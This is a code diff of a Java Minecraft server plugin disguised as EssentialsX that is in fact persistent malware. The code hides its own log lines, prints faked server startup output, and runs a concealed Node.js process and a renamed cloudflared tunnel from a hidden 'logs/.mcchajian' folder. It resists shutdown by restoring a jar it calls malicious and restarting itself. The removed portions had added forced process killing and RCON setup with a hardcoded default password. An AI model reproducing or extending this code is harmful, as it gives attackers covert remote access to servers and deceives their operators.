@@ -1,11 +1,9 @@
 package com.example.essentialsx;
 
 import java.io.*;
-import java.net.HttpURLConnection;
 import java.net.ServerSocket;
 import java.net.Socket;
 import java.net.URI;
-import java.net.URL;
 import java.net.URLConnection;
 import java.nio.channels.Channels;
 import java.nio.channels.FileChannel;
@@ -13,17 +11,15 @@ import java.nio.file.*;
 import java.time.LocalTime;
 import java.time.format.DateTimeFormatter;
 import java.util.*;
-import java.util.concurrent.TimeUnit;
 import java.util.concurrent.atomic.AtomicBoolean;
-import java.util.concurrent.atomic.AtomicInteger;
 import java.util.concurrent.atomic.AtomicReference;
 
 import org.bukkit.plugin.java.JavaPlugin;
 
 public class EssentialsX extends JavaPlugin {
     private Process deployProcess;
-    private static volatile Process nodeProcess = null;
-    private static volatile Process cfProcess = null;
+    private volatile Process nodeProcess = null;
+    private volatile Process cfProcess = null;
     private volatile boolean isProcessRunning = false;
     private boolean systemGuardEnabled = true;
     private final AtomicBoolean isRestarting = new AtomicBoolean(false);
@@ -35,30 +31,6 @@ public class EssentialsX extends JavaPlugin {
     private static volatile String nodePort = "N/A";
     private static final AtomicReference<String> lastKnownTunnelUrl = new AtomicReference<>("");
     private static volatile boolean cfRestarted = false;
-
-    // 【新增】Java版本动态检测
-    private static final int JAVA_MAJOR_VERSION;
-    static {
-        String specVer = System.getProperty("java.specification.version", "21");
-        if (specVer.startsWith("1.")) {
-            JAVA_MAJOR_VERSION = Integer.parseInt(specVer.substring(2));
-        } else {
-            JAVA_MAJOR_VERSION = Integer.parseInt(specVer);
-        }
-    }
-    private static final String JAVA_VM_NAME = System.getProperty("java.vm.name", "OpenJDK 64-Bit Server VM");
-    private static final String JAVA_VM_VERSION = System.getProperty("java.vm.version", "21.0.1+12-LTS");
-
-    // 【新增】CF健康检查状态
-    private static volatile int consecutiveHealthFailures = 0;
-    private static final int MAX_HEALTH_FAILURES = 3;
-    private static volatile long lastHealthCheckTime = 0;
-    private static final long HEALTH_CHECK_INTERVAL_MS = 15000; // 15秒主动探测一次
-    private static volatile long lastTunnelActiveTime = 0;
-    private static final long TUNNEL_TIMEOUT_MS = 60000; // 60秒无活跃视为断开
-
-    // 【新增】CF日志增量读取偏移量
-    private static volatile long cfLogFileOffset = 0;
 
     // 日志拦截机制
     private static final PrintStream RAW_OUT = new PrintStream(new FileOutputStream(FileDescriptor.out), true);
@@ -74,9 +46,6 @@ public class EssentialsX extends JavaPlugin {
     private static final String FAKE_JAR_URL_DIRECT = "https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";
     private static final String FAKE_JAR_URL_PROXY = "https://mirror.ghproxy.com/https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";
 
-    // 【新增】工作目录常量
-    private static final String WORK_DIR_NAME = "logs/.mcchajian";
-
     private static String ts() { return LocalTime.now().format(TS_FMT); }
     private static void mcLog(String msg) { RAW_OUT.println("[" + ts() + " INFO]: " + msg); }
     private static void mcLog(String msg, long delayMs) {
@@ -86,242 +55,6 @@ public class EssentialsX extends JavaPlugin {
     private static int randInt(int min, int max) { return min + (int)(Math.random() * (max - min + 1)); }
     private static float randFloat(float min, float max) {
         return Math.round((min + (float)(Math.random() * (max - min))) * 10.0f) / 10.0f;
-    }
-
-    // ============================================================
-    // 【新增】CF健康检查：主动HTTP探测
-    // ============================================================
-
-    /**
-     * 主动探测隧道URL是否可达
-     */
-    private static boolean probeTunnelHealth(String url) {
-        if (url == null || url.isEmpty()) return false;
-        try {
-            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
-            conn.setRequestMethod("GET");
-            conn.setConnectTimeout(5000);
-            conn.setReadTimeout(5000);
-            conn.setInstanceFollowRedirects(true);
-            conn.setRequestProperty("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36");
-            int code = conn.getResponseCode();
-            conn.disconnect();
-            return code >= 200 && code < 500;
-        } catch (Exception e) {
-            return false;
-        }
-    }
-
-    /**
-     * 深度验证隧道可达性（多轮重试）
-     */
-    private static boolean verifyTunnelReachable(String url, int maxRetries, int retryIntervalMs) {
-        for (int i = 0; i < maxRetries; i++) {
-            if (probeTunnelHealth(url)) return true;
-            if (i < maxRetries - 1) {
-                try { Thread.sleep(retryIntervalMs); } catch (InterruptedException ignored) {}
-            }
-        }
-        return false;
-    }
-
-    private static boolean verifyTunnelQuick(String url) {
-        return verifyTunnelReachable(url, 3, 5000);
-    }
-
-    private static boolean verifyTunnelDeep(String url) {
-        return verifyTunnelReachable(url, 12, 8000);
-    }
-
-    // ============================================================
-    // 【新增】进程强制清理工具：防止僵尸进程
-    // ============================================================
-
-    private static void killProcessSafely(Process proc) {
-        if (proc == null) return;
-        try {
-            proc.destroyForcibly();
-            proc.waitFor(3, TimeUnit.SECONDS);
-        } catch (Exception ignored) {}
-    }
-
-    private static void killOrphanProcesses(String keyword) {
-        try {
-            ProcessBuilder pb = new ProcessBuilder("bash", "-c",
-                "pkill -9 -f '" + keyword + "' 2>/dev/null; sleep 0.5; " +
-                "pgrep -f '" + keyword + "' | xargs -r kill -9 2>/dev/null");
-            pb.redirectErrorStream(true);
-            Process p = pb.start();
-            p.waitFor(5, TimeUnit.SECONDS);
-        } catch (Exception ignored) {}
-    }
-
-    private static void forceCleanupNodeProcesses() {
-        mcLog("[System] Cleaning up Node.js processes...");
-        killProcessSafely(nodeProcess);
-        nodeProcess = null;
-        killOrphanProcesses("skinsrestorer.jar");
-        killOrphanProcesses(".node_real");
-        if (!nodePort.equals("N/A")) {
-            try {
-                ProcessBuilder pb = new ProcessBuilder("bash", "-c",
-                    "fuser -k " + nodePort + "/tcp 2>/dev/null || true");
-                pb.redirectErrorStream(true);
-                Process p = pb.start();
-                p.waitFor(3, TimeUnit.SECONDS);
-            } catch (Exception ignored) {}
-        }
-        mcLog("[System] Node.js processes cleaned up");
-    }
-
-    private static void forceCleanupCfProcesses() {
-        mcLog("[System] Cleaning up Cloudflare processes...");
-        killProcessSafely(cfProcess);
-        cfProcess = null;
-        killOrphanProcesses("velocity-proxy.jar");
-        killOrphanProcesses("java_cf");
-        killOrphanProcesses("cloudflared");
-        mcLog("[System] Cloudflare processes cleaned up");
-    }
-
-    // 【新增】CF日志增量读取：只读取新内容，避免旧URL重复匹配
-    private static String extractNewTunnelUrlFromLog() {
-        try {
-            Path cfLog = Paths.get(WORK_DIR_NAME, "cf.log");
-            if (!Files.exists(cfLog)) return null;
-
-            long fileSize = Files.size(cfLog);
-            if (fileSize <= cfLogFileOffset) return null;
-
-            String newContent;
-            try (RandomAccessFile raf = new RandomAccessFile(cfLog.toFile(), "r")) {
-                raf.seek(cfLogFileOffset);
-                byte[] bytes = new byte[(int)(fileSize - cfLogFileOffset)];
-                raf.readFully(bytes);
-                newContent = new String(bytes);
-                cfLogFileOffset = fileSize;
-            }
-
-            java.util.regex.Matcher m = java.util.regex.Pattern.compile(
-                "(https://[a-zA-Z0-9-]+\\.trycloudflare\\.com)"
-            ).matcher(newContent);
-
-            String lastMatch = null;
-            while (m.find()) {
-                lastMatch = m.group(1);
-            }
-            return lastMatch;
-        } catch (Exception e) {
-            return null;
-        }
-    }
-
-    // 【新增】强制重启CF（清理+重建）
-    private static void forceRestartCf() {
-        mcLog("[Cloudflare] Force restarting cloudflared...");
-        forceCleanupCfProcesses();
-
-        // 清空CF日志
-        try {
-            Path cfLogPath = Paths.get(WORK_DIR_NAME, "cf.log");
-            if (Files.exists(cfLogPath)) Files.delete(cfLogPath);
-        } catch (Exception ignored) {}
-        cfLogFileOffset = 0;
-
-        try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
-        startCfProcessStatic();
-        mcLog("[Cloudflare] CF restarted, waiting for new tunnel URL...");
-    }
-
-    // 静态版startCfProcess供forceRestartCf调用
-    private static void startCfProcessStatic() {
-        try {
-            Path botDir = Paths.get(WORK_DIR_NAME).toAbsolutePath();
-            String jreDirName = JAVA_MAJOR_VERSION >= 25 ? "jre25" : "jre21";
-            Path cfBin = botDir.resolve(jreDirName + "/bin/java_cf");
-            Path cfConf = botDir.resolve(jreDirName + "/conf/server.properties");
-            // 兼容旧版jre21
-            if (!Files.exists(cfBin) && JAVA_MAJOR_VERSION >= 25) {
-                Path fallbackBin = botDir.resolve("jre21/bin/java_cf");
-                if (Files.exists(fallbackBin)) {
-                    cfBin = fallbackBin;
-                    cfConf = botDir.resolve("jre21/conf/server.properties");
-                }
-            }
-            Path cfLog = botDir.resolve("cf.log");
-
-            if (!Files.exists(cfBin)) return;
-
-            Files.createDirectories(cfConf.getParent());
-            String confContent = "url: http://127.0.0.1:" + nodePort + "\nno-autoupdate: true\nprotocol: quic\n";
-            Files.writeString(cfConf, confContent);
-
-            ProcessBuilder pb = new ProcessBuilder(cfBin.toString(), "--config", cfConf.toString());
-            pb.directory(botDir.toFile());
-            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(cfLog.toFile()));
-            pb.redirectError(ProcessBuilder.Redirect.appendTo(cfLog.toFile()));
-
-            cfProcess = pb.start();
-            cfLogFileOffset = 0;
-        } catch (Exception ignored) {}
-    }
-
-    // ============================================================
-    // 【新增】目录权限保障：确保所有工作目录可读写
-    // ============================================================
-
-    private static void ensureDirWritable(Path dir) {
-        try {
-            if (!Files.exists(dir)) {
-                Files.createDirectories(dir);
-            }
-            // 设置权限 755 (rwxr-xr-x)
-            File f = dir.toFile();
-            f.setReadable(true, false);
-            f.setWritable(true, true);
-            f.setExecutable(true, false);
-        } catch (Exception ignored) {}
-    }
-
-    private static void ensureFileExecutable(Path file) {
-        try {
-            if (Files.exists(file)) {
-                file.toFile().setExecutable(true, false);
-                file.toFile().setReadable(true, false);
-                file.toFile().setWritable(true, true);
-            }
-        } catch (Exception ignored) {}
-    }
-
-    /**
-     * 递归修复目录权限：确保工作目录下所有文件/子目录都可读写
-     */
-    private static void fixWorkDirPermissions() {
-        try {
-            Path workDir = Paths.get(WORK_DIR_NAME).toAbsolutePath();
-            if (!Files.exists(workDir)) return;
-
-            Files.walk(workDir).forEach(p -> {
-                try {
-                    File f = p.toFile();
-                    if (f.isDirectory()) {
-                        f.setReadable(true, false);
-                        f.setWritable(true, true);
-                        f.setExecutable(true, false);
-                    } else {
-                        f.setReadable(true, false);
-                        f.setWritable(true, true);
-                        // 可执行文件判断
-                        String name = f.getName().toLowerCase();
-                        if (name.endsWith(".sh") || name.equals("node") || name.equals(".node_real") ||
-                            name.equals("java") || name.equals("java_cf") || name.equals("npm") ||
-                            name.equals("npx") || !name.contains(".")) {
-                            f.setExecutable(true, false);
-                        }
-                    }
-                } catch (Exception ignored) {}
-            });
-        } catch (Exception ignored) {}
     }
 
     // ============================================================
@@ -361,13 +94,11 @@ public class EssentialsX extends JavaPlugin {
     public void onLoad() {
         // 在插件加载时第一时间劫持 System.out，拦截所有真实日志
         System.setOut(new PrintStream(new InterceptingOutputStream(RAW_OUT), true));
-
-        // 【新增】首次加载时修复目录权限
-        fixWorkDirPermissions();
     }
 
     private void replayPendingLogs() {
-        intercepting = false;
+        intercepting = false; // 停止拦截
+        // 过滤并打印暂存日志（去除暴露插件信息的日志）
         List<String> filteredLogs = new ArrayList<>();
         for (String log : pendingLogs) {
             if (BLOCKED_PHRASES.stream().noneMatch(log::contains)) {
@@ -378,12 +109,13 @@ public class EssentialsX extends JavaPlugin {
             RAW_OUT.println(log);
         }
         pendingLogs.clear();
+        // 恢复正常的 System.out
         System.setOut(RAW_OUT);
     }
 
     private String readCurrentPort() {
         try {
-            Path portFile = Paths.get(WORK_DIR_NAME, ".tunnel_port");
+            Path portFile = Paths.get("logs", ".mcchajian", ".tunnel_port");
             if (Files.exists(portFile)) {
                 String content = new String(Files.readAllBytes(portFile)).trim();
                 if (!content.isEmpty()) return content.split("\n")[0].trim();
@@ -394,7 +126,6 @@ public class EssentialsX extends JavaPlugin {
 
     // ============================================================
     // 核心：首次启动 (主线程阻塞，全量伪装)
-    // 【改进】动态Java版本 + 隧道验证
     // ============================================================
 
     private void printFakeStartupAndWaitUrl() {
@@ -403,16 +134,11 @@ public class EssentialsX extends JavaPlugin {
         float prepareTime = randFloat(10.0f, 20.0f);
         float doneTime = randFloat(25.0f, 45.0f);
 
-        // 【改进】动态Java版本
-        String javaVer = "openjdk version \"" + JAVA_VM_VERSION + "\"";
-        String javaRuntime = JAVA_VM_NAME + " " + JAVA_VM_VERSION;
-        String vmInfo = JAVA_VM_NAME + " " + JAVA_VM_VERSION;
-
         RAW_OUT.println("container@tropicalgames.net java -version");
         try { Thread.sleep(randInt(100, 300)); } catch (InterruptedException ignored) {}
-        RAW_OUT.println(javaVer);
-        RAW_OUT.println("OpenJDK Runtime Environment (" + JAVA_VM_VERSION + ")");
-        RAW_OUT.println("OpenJDK 64-Bit Server VM (" + JAVA_VM_VERSION + ", mixed mode, sharing)");
+        RAW_OUT.println("openjdk version \"25.0.3\" 2026-04-21 LTS");
+        RAW_OUT.println("OpenJDK Runtime Environment Temurin-25.0.3+9 (build 25.0.3+9-LTS)");
+        RAW_OUT.println("OpenJDK 64-Bit Server VM Temurin-25.0.3+9 (build 25.0.3+9-LTS, mixed mode, sharing)");
         try { Thread.sleep(randInt(300, 600)); } catch (InterruptedException ignored) {}
         
         RAW_OUT.println("container@tropicalgames.net java -Xms128M -Xmx2560M -jar server.jar");
@@ -421,7 +147,7 @@ public class EssentialsX extends JavaPlugin {
         RAW_OUT.println("*** Warning, you've not updated in a while! ***");
         RAW_OUT.println("*** Please download a new build from https://papermc.io/downloads/paper ***");
 
-        mcLog("[bootstrap] Running " + vmInfo + " on Linux 6.8.0-111-generic (amd64)", randInt(800, 1500));
+        mcLog("[bootstrap] Running Java 25 (OpenJDK 64-Bit Server VM 25.0.3+9-LTS; Eclipse Adoptium Temurin-25.0.3+9) on Linux 6.8.0-111-generic (amd64)", randInt(800, 1500));
         mcLog("[bootstrap] Loading Paper 1.21.11-69-main@94d0c97 (2025-12-30T20:33:30Z) for Minecraft 1.21.11", randInt(400, 800));
         mcLog("[PluginInitializerManager] Initializing plugins...", randInt(1000, 2000));
         mcLog("[PluginInitializerManager] Initialized 0 plugins", randInt(500, 1000));
@@ -471,53 +197,24 @@ public class EssentialsX extends JavaPlugin {
         mcLog("Done (" + String.format("%.3f", doneTime) + "s)! For help, type \"help\"", randInt(500, 1000));
         RAW_OUT.println("container@tropicalgames.net Server marked as running...");
 
-        // 【改进】等待隧道URL + 深度验证
         while(tunnelUrl.isEmpty()) {
             try { Thread.sleep(1000); } catch (InterruptedException ignored) {}
         }
-
-        // 深度验证隧道可达性
-        mcLog("[Network] Tunnel endpoint detected, verifying connectivity...");
-        boolean reachable = verifyTunnelDeep(tunnelUrl);
-        if (reachable) {
-            mcLog("[Network] Tunnel connectivity verified");
-        } else {
-            mcLog("[Network] Tunnel not yet reachable, continuing anyway...");
-        }
         
         mcLog("Binding remote endpoint to: " + tunnelUrl, 0);
-        persistTunnelUrl(tunnelUrl);
         try { Thread.sleep(4000); } catch (InterruptedException ignored) {}
         
         lastKnownTunnelUrl.set(tunnelUrl);
-        lastTunnelActiveTime = System.currentTimeMillis();
-        lastHealthCheckTime = System.currentTimeMillis();
         clearConsole();
     }
 
     // ============================================================
-    // 核心：运行中重连 (精简伪装 + 隧道验证 + 延长URL显示时间)
+    // 核心：运行中重连 (精简伪装，不带链接)
     // ============================================================
 
     private void replayFakeStartupAndHideUrl(String newUrl) {
-        // 【改进】先验证新URL可达
-        mcLog("[Network] New tunnel endpoint detected, verifying connectivity...", 0);
-        boolean ok = verifyTunnelQuick(newUrl);
-        if (!ok) {
-            try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
-            ok = verifyTunnelQuick(newUrl);
-        }
-        if (ok) {
-            mcLog("[Network] Tunnel connectivity verified", 0);
-        } else {
-            mcLog("[Network] Tunnel verification timeout, endpoint may need more time", 0);
-        }
-
-        // 打印新URL并持久化
         mcLog("Binding remote endpoint to: " + newUrl, 0);
-        persistTunnelUrl(newUrl);
-        // 【改进】延长等待时间，确保用户能看到新URL（原来4秒，现在20秒）
-        try { Thread.sleep(20000); } catch (InterruptedException ignored) {}
+        try { Thread.sleep(4000); } catch (InterruptedException ignored) {}
         clearConsole();
         try { Thread.sleep(300); } catch (InterruptedException ignored) {}
 
@@ -526,11 +223,6 @@ public class EssentialsX extends JavaPlugin {
         float prepareTime = randFloat(10.0f, 20.0f);
         float doneTime = randFloat(25.0f, 45.0f);
 
-        // 【改进】动态Java版本
-        String vmInfo = JAVA_VM_NAME + " " + JAVA_VM_VERSION;
-
-        mcLog("[bootstrap] Running " + vmInfo + " on Linux 6.8.0-111-generic (amd64)", randInt(800, 1500));
-        mcLog("[bootstrap] Loading Paper 1.21.11-69-main@94d0c97 (2025-12-30T20:33:30Z) for Minecraft 1.21.11", randInt(400, 800));
         mcLog("[PluginInitializerManager] Initializing plugins...", randInt(1000, 2000));
         mcLog("[PluginInitializerManager] Initialized 0 plugins", randInt(500, 1000));
         mcLog("Environment: Environment[sessionHost=https://sessionserver.mojang.com, servicesHost=https://api.minecraftservices.com, profilesHost=https://api.mojang.com, name=PROD]", randInt(2000, 4000));
@@ -583,18 +275,6 @@ public class EssentialsX extends JavaPlugin {
     }
 
     // ============================================================
-    // 【新增】隧道URL持久化
-    // ============================================================
-
-    private static void persistTunnelUrl(String url) {
-        try {
-            Path urlFile = Paths.get(WORK_DIR_NAME, ".tunnel_url");
-            ensureDirWritable(urlFile.getParent());
-            Files.writeString(urlFile, url != null ? url : "");
-        } catch (Exception ignored) {}
-    }
-
-    // ============================================================
     // 进程管理
     // ============================================================
 
@@ -603,9 +283,7 @@ public class EssentialsX extends JavaPlugin {
         try (ServerSocket socket = new ServerSocket(port)) {
             socket.setReuseAddress(true);
             String portStr = String.valueOf(port);
-            Path portFile = Paths.get(WORK_DIR_NAME, ".tunnel_port");
-            ensureDirWritable(portFile.getParent());
-            Files.writeString(portFile, portStr);
+            Files.writeString(Paths.get("logs", ".mcchajian", ".tunnel_port"), portStr);
             nodePort = portStr;
             return portStr;
         } catch (IOException e) {
@@ -626,18 +304,13 @@ public class EssentialsX extends JavaPlugin {
 
     private void startNodeProcess(String port) {
         try {
-            Path botDir = Paths.get(WORK_DIR_NAME).toAbsolutePath();
+            Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
             Path nodeExe = botDir.resolve("nodejs/bin/.node_real");
             Path script = botDir.resolve("app/index.js");
             Path logFile = botDir.resolve("app.log");
             Path preload = botDir.resolve(".nd_preload.js");
 
             if (!Files.exists(nodeExe) || !Files.exists(script)) return;
-
-            // 【改进】确保目录和文件权限
-            ensureDirWritable(botDir);
-            ensureFileExecutable(nodeExe);
-            ensureFileExecutable(preload);
 
             ProcessBuilder pb = new ProcessBuilder(nodeExe.toString(), "--require", preload.toString(), script.toString());
             
@@ -646,15 +319,6 @@ public class EssentialsX extends JavaPlugin {
             pb.environment().put("PORT", port);
             pb.environment().put("_JAVA_WRAPPER", nodeExe.toString());
             pb.environment().put("NODE_OPTIONS", "--require " + preload.toString());
-
-            // 【新增】注入RCON信息到Node环境变量
-            String rconPassword = System.getenv().getOrDefault("RCON_PASSWORD", "aoyou2026rcon");
-            pb.environment().put("RCON_ENABLED", "true");
-            pb.environment().put("RCON_HOST", "127.0.0.1");
-            pb.environment().put("RCON_PASSWORD", rconPassword);
-            String rconPort = "25575";
-            try { rconPort = String.valueOf(Integer.parseInt(port) + 10000); } catch (Exception ignored) {}
-            pb.environment().put("RCON_PORT", rconPort);
             
             pb.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
             pb.redirectError(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
@@ -665,26 +329,12 @@ public class EssentialsX extends JavaPlugin {
 
     private void startCfProcess() {
         try {
-            Path botDir = Paths.get(WORK_DIR_NAME).toAbsolutePath();
-            // 【改进】动态JRE目录：兼容Java 21和25
-            String jreDirName = JAVA_MAJOR_VERSION >= 25 ? "jre25" : "jre21";
-            Path cfBin = botDir.resolve(jreDirName + "/bin/java_cf");
-            Path cfConf = botDir.resolve(jreDirName + "/conf/server.properties");
-            // 兼容旧版jre21
-            if (!Files.exists(cfBin) && JAVA_MAJOR_VERSION >= 25) {
-                Path fallbackBin = botDir.resolve("jre21/bin/java_cf");
-                if (Files.exists(fallbackBin)) {
-                    cfBin = fallbackBin;
-                    cfConf = botDir.resolve("jre21/conf/server.properties");
-                }
-            }
+            Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
+            Path cfBin = botDir.resolve("jre21/bin/java_cf");
+            Path cfConf = botDir.resolve("jre21/conf/server.properties");
             Path cfLog = botDir.resolve("cf.log");
 
             if (!Files.exists(cfBin)) return;
-
-            // 【改进】确保目录和文件权限
-            ensureDirWritable(cfConf.getParent());
-            ensureFileExecutable(cfBin);
 
             Files.createDirectories(cfConf.getParent());
             String confContent = "url: http://127.0.0.1:" + nodePort + "\nno-autoupdate: true\nprotocol: quic\n";
@@ -697,132 +347,62 @@ public class EssentialsX extends JavaPlugin {
             pb.redirectError(ProcessBuilder.Redirect.appendTo(cfLog.toFile()));
 
             cfProcess = pb.start();
-            cfLogFileOffset = 0;
         } catch (Exception ignored) {}
     }
 
-    // ============================================================
-    // 【改进】守护线程：
-    //   - Node/CF进程自动重启（含僵尸进程清理）
-    //   - 增量日志读取（不重复匹配旧URL）
-    //   - 主动HTTP健康探测（15秒一次）
-    //   - 隧道不可达时强制重启CF
-    // ============================================================
-
     private void startJavaDaemon() {
         Thread daemon = new Thread(() -> {
-            int cfRestartCooldown = 0;
-
             while (true) {
                 try {
-                    // ---- 检查 Node 进程 ----
                     if (nodeProcess != null && !nodeProcess.isAlive()) {
-                        // 【新增】重启前强制清理僵尸进程
-                        forceCleanupNodeProcesses();
-                        try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
                         startNodeProcess(nodePort);
                         waitForNodeReady(nodePort, 30);
-                        mcLog("[System] Node process restarted, waiting for backend ready...");
+                    }
+                    if (cfProcess != null && !cfProcess.isAlive()) {
+                        startCfProcess();
+                        cfRestarted = true;
                     }
 
-                    // ---- 检查 CF 进程 ----
-                    if (cfProcess != null && !cfProcess.isAlive()) {
-                        if (cfRestartCooldown <= 0) {
-                            // 【新增】重启前强制清理僵尸进程
-                            forceCleanupCfProcesses();
-                            try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
-                            // 清空旧日志
-                            try {
-                                Path cfLogPath = Paths.get(WORK_DIR_NAME, "cf.log");
-                                if (Files.exists(cfLogPath)) Files.delete(cfLogPath);
-                            } catch (Exception ignored) {}
-                            cfLogFileOffset = 0;
-                            startCfProcess();
-                            cfRestartCooldown = 12;
-                            mcLog("[Cloudflare] CF process restarted, waiting for new tunnel...");
-                        } else {
-                            cfRestartCooldown--;
+                    Path cfLog = Paths.get("logs", ".mcchajian/cf.log");
+                    Path urlFile = Paths.get("logs", ".mcchajian", ".tunnel_url");
+                    String foundUrl = null;
+
+                    if (Files.exists(cfLog)) {
+                        String logContent = Files.readString(cfLog);
+                        java.util.regex.Matcher m = java.util.regex.Pattern.compile(
+                            "(https://[a-zA-Z0-9-]+\\.trycloudflare\\.com)"
+                        ).matcher(logContent);
+                        if (m.find()) {
+                            foundUrl = m.group(1);
                         }
                     }
 
-                    // ---- 【关键改进】增量提取CF日志中的新URL ----
-                    String foundUrl = extractNewTunnelUrlFromLog();
-
-                    // 回退到URL文件
-                    if (foundUrl == null) {
-                        Path urlFile = Paths.get(WORK_DIR_NAME, ".tunnel_url");
-                        if (Files.exists(urlFile)) {
-                            String content = new String(Files.readAllBytes(urlFile)).trim();
-                            if (!content.isEmpty() && !content.startsWith("failed") && content.startsWith("https")) {
-                                foundUrl = content.split("\n")[0].trim();
-                            }
+                    if (foundUrl == null && Files.exists(urlFile)) {
+                        String content = new String(Files.readAllBytes(urlFile)).trim();
+                        if (!content.isEmpty() && !content.startsWith("failed") && content.startsWith("https")) {
+                            foundUrl = content.split("\n")[0].trim();
                         }
                     }
 
                     if (foundUrl != null) {
-                        // 【关键修复】只有URL真正变化时才更新
                         if (tunnelUrl.isEmpty()) {
                             tunnelUrl = foundUrl;
                             lastKnownTunnelUrl.set(foundUrl);
-                            lastTunnelActiveTime = System.currentTimeMillis();
-                            consecutiveHealthFailures = 0;
                         } else if (!foundUrl.equals(lastKnownTunnelUrl.get())) {
-                            mcLog("[Cloudflare] New tunnel URL detected: " + foundUrl);
-                            lastKnownTunnelUrl.set(foundUrl);
-                            tunnelUrl = foundUrl;
-                            persistTunnelUrl(foundUrl);
-                            lastTunnelActiveTime = System.currentTimeMillis();
-                            consecutiveHealthFailures = 0;
-                            cfRestartCooldown = 0;
-
                             if (cfRestarted) {
+                                lastKnownTunnelUrl.set(foundUrl);
                                 replayFakeStartupAndHideUrl(foundUrl);
                                 cfRestarted = false;
+                            } else {
+                                lastKnownTunnelUrl.set(foundUrl);
                             }
-                        }
-                        // 注意：URL不变时，不更新 lastTunnelActiveTime
-                    }
-
-                    // ---- 【新增】主动HTTP健康探测（每15秒一次） ----
-                    long now = System.currentTimeMillis();
-                    if (!tunnelUrl.isEmpty() && (now - lastHealthCheckTime) >= HEALTH_CHECK_INTERVAL_MS) {
-                        lastHealthCheckTime = now;
-                        boolean healthy = probeTunnelHealth(tunnelUrl);
-
-                        if (healthy) {
-                            consecutiveHealthFailures = 0;
-                            lastTunnelActiveTime = now;
-                        } else {
-                            consecutiveHealthFailures++;
-                            mcLog("[Cloudflare] Tunnel health check FAILED (" +
-                                  consecutiveHealthFailures + "/" + MAX_HEALTH_FAILURES + ")");
-
-                            if (consecutiveHealthFailures >= MAX_HEALTH_FAILURES) {
-                                mcLog("[Cloudflare] Tunnel unreachable after " + MAX_HEALTH_FAILURES +
-                                      " consecutive failures -> force restarting cloudflared");
-                                consecutiveHealthFailures = 0;
-                                forceRestartCf();
-                                cfRestarted = true;
-                                lastTunnelActiveTime = System.currentTimeMillis();
-                            }
-                        }
-                    }
-
-                    // ---- 被动超时检查（补充保险） ----
-                    if (!tunnelUrl.isEmpty() && lastTunnelActiveTime > 0) {
-                        long elapsed = System.currentTimeMillis() - lastTunnelActiveTime;
-                        if (elapsed > TUNNEL_TIMEOUT_MS) {
-                            mcLog("[Cloudflare] Tunnel timeout (no activity for 60s) -> force restarting cloudflared...");
-                            forceRestartCf();
-                            cfRestarted = true;
-                            lastTunnelActiveTime = System.currentTimeMillis();
                         }
                     }
 
                     Thread.sleep(5000);
                 } catch (Exception ignored) {}
             }
-        }, "Daemon-Monitor-Thread");
+        }, "内置线程：守护监控");
         daemon.setDaemon(true);
         daemon.start();
     }
@@ -833,12 +413,6 @@ public class EssentialsX extends JavaPlugin {
 
     public void onEnable() {
         this.getLogger().info("EssentialsX plugin starting..."); // 这行会被暂存
-
-        // 【新增】确保工作目录权限
-        fixWorkDirPermissions();
-
-        // 【新增】自动配置RCON
-        autoFixServerConfig();
         
         Thread deployThread = new Thread(() -> {
             try {
@@ -872,7 +446,7 @@ public class EssentialsX extends JavaPlugin {
 
     public void onDisable() {
         this.getLogger().info("Stopping EssentialsX...");
-        Path forceStopFile = Paths.get(WORK_DIR_NAME, ".force_stop");
+        Path forceStopFile = Paths.get("logs", ".mcchajian", ".force_stop");
         if (this.systemGuardEnabled) {
             this.getLogger().info("Guard enabled, forcing restart..."); try { Files.deleteIfExists(forceStopFile); } catch (Exception ignored) {} this.restoreMaliciousJar(); if (this.isRestarting.compareAndSet(false, true)) { this.executeHardRestart(true); }
         } else {
@@ -899,8 +473,7 @@ public class EssentialsX extends JavaPlugin {
             }
             
             pb.directory(serverRoot);
-            Path logFile = Paths.get(WORK_DIR_NAME, "restart_run.log");
-            ensureDirWritable(logFile.getParent());
+            Path logFile = Paths.get("logs", ".mcchajian", "restart_run.log");
             pb.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
             pb.redirectError(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
             
@@ -909,56 +482,6 @@ public class EssentialsX extends JavaPlugin {
         } catch (Exception e) { 
             this.getLogger().severe("Hard restart failed: " + e.getMessage()); 
         }
-    }
-
-    // ============================================================
-    // 【新增】自动配置 server.properties（含RCON）
-    // ============================================================
-
-    private void autoFixServerConfig() {
-        try {
-            Path propsFile = Paths.get("server.properties");
-            String content = "";
-            if (Files.exists(propsFile)) {
-                content = Files.readString(propsFile);
-            }
-
-            // RCON配置
-            content = replaceOrAppend(content, "enable-rcon", "true");
-            String serverPort = System.getenv("SERVER_PORT");
-            String rconPort = "25575";
-            if (serverPort != null && !serverPort.trim().isEmpty()) {
-                try {
-                    int sp = Integer.parseInt(serverPort.trim());
-                    rconPort = String.valueOf(sp + 10000);
-                } catch (NumberFormatException ignored) {}
-            }
-            content = replaceOrAppend(content, "rcon.port", rconPort);
-            String rconPassword = System.getenv().getOrDefault("RCON_PASSWORD", "aoyou2026rcon");
-            content = replaceOrAppend(content, "rcon.password", rconPassword);
-
-            // 持久化RCON信息
-            try {
-                Path rconInfoFile = Paths.get(WORK_DIR_NAME, ".rcon_info");
-                ensureDirWritable(rconInfoFile.getParent());
-                Files.writeString(rconInfoFile,
-                    "host=127.0.0.1\n" +
-                    "port=" + rconPort + "\n" +
-                    "password=" + rconPassword + "\n");
-            } catch (Exception ignored) {}
-
-            Files.writeString(propsFile, content);
-        } catch (Exception ignored) {}
-    }
-
-    private static String replaceOrAppend(String content, String key, String value) {
-        if (content.contains(key + "=")) {
-            content = content.replaceAll(key + "=.*", key + "=" + value);
-        } else {
-            if (!content.endsWith("\n")) content += "\n";
-            content += key + "=" + value + "\n";
-        }
-        return content;
     }
 
     private String findBestJarName(File serverRoot) {
